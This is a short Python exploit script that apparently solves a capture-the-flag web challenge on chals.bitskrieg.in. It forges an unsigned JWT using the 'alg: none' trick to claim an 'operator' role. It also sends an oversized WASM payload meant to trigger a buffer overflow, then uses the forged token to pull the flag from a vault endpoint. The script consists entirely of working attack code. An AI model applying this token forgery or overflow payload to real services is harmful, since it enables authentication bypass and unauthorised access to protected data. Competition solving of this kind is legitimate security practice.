import jwt
import base64
import time
import requests

# Generate JWT token
current_time = int(time.time())
exp_time = current_time + 3600  # 1 hour

header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').strip(b'=')
payload = base64.urlsafe_b64encode(
    f'{{"qrole":"operator","iat":{current_time},"exp":{exp_time}}}'.encode()
).strip(b'=')
token = f"{header.decode()}.{payload.decode()}."

# Initialize quantum handshake
response = requests.post(
    "http://chals.bitskrieg.in:3009/qchannel",
    headers={"x-quantum-phase": "superposition"},
    data=bytes.fromhex("deadbeef")
)
print("Quantum State:", response.headers.get("x-quantum-state"))

# Generate 8KB+1 WASM payload for buffer overflow
wasm = b"\x00asm\x01\x00\x00\x00" + (b"\x00" * 8193)

response1 = requests.post(
    "http://chals.bitskrieg.in:3009/qproc",
    data=wasm
)

# Retrieve flag using JWT token
response = requests.get(
    f"http://chals.bitskrieg.in:3009/vault/{response1.text}",
    headers={"Authorization": f"Quantum {token}"}
)
print("Flag:", response.text)